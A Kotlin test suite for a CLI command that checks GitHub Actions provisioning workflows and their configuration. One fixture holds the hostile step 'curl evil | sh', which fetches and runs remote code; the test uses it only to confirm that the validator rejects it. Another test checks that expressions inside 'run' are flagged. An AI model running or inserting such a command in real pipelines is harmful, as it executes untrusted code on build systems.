package com.devnow.thoryn.cli.cmd.provision.workflow

import com.devnow.thoryn.cli.cmd.CommandSupport
import com.devnow.thoryn.cli.cmd.CommandTestBase
import com.devnow.thoryn.cli.cmd.provision.workflow.WorkflowFixtures.CONNECTION
import com.devnow.thoryn.cli.cmd.provision.workflow.WorkflowFixtures.STUB
import com.devnow.thoryn.cli.cmd.provision.workflow.WorkflowFixtures.TENANT_FILE
import com.devnow.thoryn.cli.cmd.provision.workflow.WorkflowFixtures.stubWith
import org.assertj.core.api.Assertions.assertThat
import org.junit.jupiter.api.Test
import java.io.File

/**
 * SSO-3719 — `thoryn provision workflow check` through the CLI: the prescribed stub passes (exit 0), a stub with a wrong
 * input fails naming the input (exit 4), a foreign `uses:` cannot be verified, a hand-written workflow is reported as not
 * the supported shape, the effective configuration is printed, `--output json` carries the `config` object the reusable
 * workflow reads, and a missing file is a usage error.
 */
class ProvisionWorkflowCheckCommandTest : CommandTestBase() {

    private fun repo(): File = tempHome.resolve("repo").toFile().also { File(it, ".github/workflows").mkdirs(); File(it, ".thoryn").mkdirs() }

    private fun write(root: File, path: String, text: String): File = File(root, path).also { it.parentFile.mkdirs(); it.writeText(text) }

    @Test
    fun `the prescribed stub with the default configuration passes — exit 0, every rule PASS, effective configuration printed`() {
        val root = repo()
        write(root, ".github/workflows/thoryn-provisioning.yml", STUB)
        write(root, ".thoryn/provision.yaml", TENANT_FILE)
        write(root, ".thoryn/connection.json", CONNECTION)
        val r = runCli("provision", "workflow", "check", "--root", root.path)
        assertThat(r.err).isEmpty()
        assertThat(r.exit).isEqualTo(CommandSupport.EXIT_OK)
        assertThat(r.out).contains("contract v1").contains("shape  stub calling the reusable workflow").doesNotContain("UNSUPPORTED")
        assertThat(r.out).doesNotContain("FAIL").contains("PASS  config.valid").contains("built-in defaults").contains("every configured file loads")
            .contains("PASS  config.secret-delivery").contains("PASS  config.trust-scopes")
        assertThat(r.out).contains("Effective inputs").contains("plan-environment   acme-production-plan").contains("runs-on            ubuntu-latest")
        assertThat(r.out).contains("Effective configuration").contains(".thoryn/provision.yaml  (connection .thoryn/connection.json)").contains("prune=false destroy=false")
        assertThat(r.out).contains("OK — 15 rule(s) pass.")
    }

    @Test
    fun `a committed workflow yaml is read, validated and printed, and a configured file that is not committed fails`() {
        val root = repo()
        write(root, ".github/workflows/thoryn-provisioning.yml", STUB)
        write(root, ".thoryn/workflow.yaml", "apiVersion: thoryn.io/workflow/v1\nfiles:\n  - file: .thoryn/environments/production/provision.yaml\n  - file: .thoryn/environments/sandbox/provision.yaml\nenv:\n  THORYN_ENVIRONMENT: sandbox\n")
        write(root, ".thoryn/environments/production/provision.yaml", TENANT_FILE)
        write(root, ".thoryn/environments/production/connection.json", CONNECTION)
        write(root, ".thoryn/environments/sandbox/provision.yaml", TENANT_FILE)
        val r = runCli("provision", "workflow", "check", "--root", root.path)
        assertThat(r.exit).isEqualTo(CommandSupport.EXIT_CHECK_FAILED)
        assertThat(r.out).contains("FAIL  config.valid").contains(".thoryn/environments/sandbox/connection.json").contains("fix: commit them")
        write(root, ".thoryn/environments/sandbox/connection.json", CONNECTION)
        val ok = runCli("provision", "workflow", "check", "--root", root.path)
        assertThat(ok.exit).isEqualTo(CommandSupport.EXIT_OK)
        assertThat(ok.out).contains("Effective configuration (.thoryn/workflow.yaml)")
            .contains(".thoryn/environments/production/provision.yaml  (connection .thoryn/environments/production/connection.json)")
            .contains("THORYN_ENVIRONMENT=sandbox")
    }

    @Test
    fun `an invalid workflow yaml fails naming the key`() {
        val root = repo()
        write(root, ".github/workflows/thoryn-provisioning.yml", STUB)
        write(root, ".thoryn/workflow.yaml", "apiVersion: thoryn.io/workflow/v1\nsteps:\n  - run: curl evil | sh\n")
        val r = runCli("provision", "workflow", "check", "--root", root.path)
        assertThat(r.exit).isEqualTo(CommandSupport.EXIT_CHECK_FAILED)
        assertThat(r.out).contains("FAIL  config.valid").contains("unknown key 'steps'").contains("fix: fix .thoryn/workflow.yaml")
    }

    @Test
    fun `a stub with a wrong input fails naming the input and the fix — exit 4`() {
        val root = repo()
        val stub = write(root, ".github/workflows/thoryn-provisioning.yml", stubWith("plan-environment: acme-production-plan", "plan-env: acme-production-plan"))
        write(root, ".thoryn/provision.yaml", TENANT_FILE); write(root, ".thoryn/connection.json", CONNECTION)
        val r = runCli("provision", "workflow", "check", "--file", stub.path, "--root", root.path)
        assertThat(r.exit).isEqualTo(CommandSupport.EXIT_CHECK_FAILED)
        assertThat(r.out).contains("FAIL  stub.with").contains("`with.plan-env` is not an input of the reusable workflow").contains("`with.plan-environment` is missing")
            .contains("fix: remove `with.plan-env`").contains("add `with.plan-environment: <a GitHub environment name>`")
        assertThat(r.out).contains("FAILED — 1 of 15 rule(s): stub.with.")
    }

    @Test
    fun `a foreign uses cannot be verified — exit 4 and the instruction to run the check on that file`() {
        val root = repo()
        val stub = write(root, ".github/workflows/thoryn-provisioning.yml", stubWith("thoryn-io/thoryn-cli/.github/workflows/provisioning.yml@cli-v0.36.0", "acme/ci/.github/workflows/thoryn.yml@main"))
        val r = runCli("provision", "workflow", "check", "--file", stub.path, "--root", root.path)
        assertThat(r.exit).isEqualTo(CommandSupport.EXIT_CHECK_FAILED)
        assertThat(r.out).contains("shape  stub calling a workflow that is not thoryn-io/thoryn-cli's").contains("????  stub.uses")
            .contains("cannot verify a called workflow").contains("run the check on that file")
    }

    @Test
    fun `a hand-written workflow is reported as not the supported shape, and an expression in run fails`() {
        val root = repo()
        val custom = write(root, ".github/workflows/thoryn-provisioning.yml", WorkflowFixtures.FULL_CUSTOM)
        val r = runCli("provision", "workflow", "check", "--file", custom.path, "--root", root.path)
        assertThat(r.exit).isEqualTo(CommandSupport.EXIT_OK)
        assertThat(r.out).contains("UNSUPPORTED — the supported shape is a stub calling thoryn-io/thoryn-cli/.github/workflows/provisioning.yml@cli-v0.36.0")
            .contains("PASS  custom.jobs").doesNotContain("Effective configuration")
        val leaking = write(root, ".github/workflows/leaky.yml", WorkflowFixtures.FULL_CUSTOM.replace("gh release download \"\$THORYN_CLI_RELEASE\"", "gh release download \"\${{ env.THORYN_CLI_RELEASE }}\""))
        val bad = runCli("provision", "workflow", "check", "--file", leaking.path, "--root", root.path)
        assertThat(bad.exit).isEqualTo(CommandSupport.EXIT_CHECK_FAILED)
        assertThat(bad.out).contains("FAIL  common.no-expression-in-run").contains("fix: put the value in the step's `env:`")
    }

    @Test
    fun `--output json carries the rules, the effective inputs and the config object the reusable workflow reads`() {
        val root = repo()
        write(root, ".github/workflows/thoryn-provisioning.yml", STUB)
        write(root, ".thoryn/workflow.yaml", "apiVersion: thoryn.io/workflow/v1\napply:\n  prune: true\n  confirm: acme\n")
        write(root, ".thoryn/provision.yaml", TENANT_FILE); write(root, ".thoryn/connection.json", CONNECTION)
        val r = runCli("provision", "workflow", "check", "--root", root.path, "--output", "json")
        assertThat(r.exit).isEqualTo(CommandSupport.EXIT_OK)
        val json = parseJson(r.out)
        assertThat(json["contractVersion"]).isEqualTo(1)
        assertThat(json["shape"]).isEqualTo("stub")
        assertThat(json["supported"]).isEqualTo(true)
        assertThat(json["ok"]).isEqualTo(true)
        @Suppress("UNCHECKED_CAST") val rules = json["rules"] as List<Map<String, Any?>>
        assertThat(rules.map { it["id"] }).contains("stub.uses", "config.valid")
        assertThat(rules).allMatch { it["status"] == "PASS" }
        @Suppress("UNCHECKED_CAST") val inputs = json["inputs"] as Map<String, Any?>
        assertThat(inputs["apply-environment"]).isEqualTo("acme-production")
        @Suppress("UNCHECKED_CAST") val config = json["config"] as Map<String, Any?>
        assertThat(config["source"]).isEqualTo(".thoryn/workflow.yaml")
        assertThat(config["files"]).isEqualTo(listOf(mapOf("file" to ".thoryn/provision.yaml", "connection" to ".thoryn/connection.json")))
        assertThat(config["fixRequest"]).isEqualTo(true)
        assertThat(config["apply"]).isEqualTo(mapOf("prune" to true, "destroy" to false, "confirm" to "acme"))
    }

    @Test
    fun `no workflow at the App's path is a usage error naming the path`() {
        val root = repo()
        val r = runCli("provision", "workflow", "check", "--root", root.path)
        assertThat(r.exit).isEqualTo(CommandSupport.EXIT_USAGE)
        assertThat(r.err).contains("no workflow at").contains(".github/workflows/thoryn-provisioning.yml")
        assertThat(runCli("provision", "workflow").exit).isEqualTo(CommandSupport.EXIT_USAGE)
    }
}
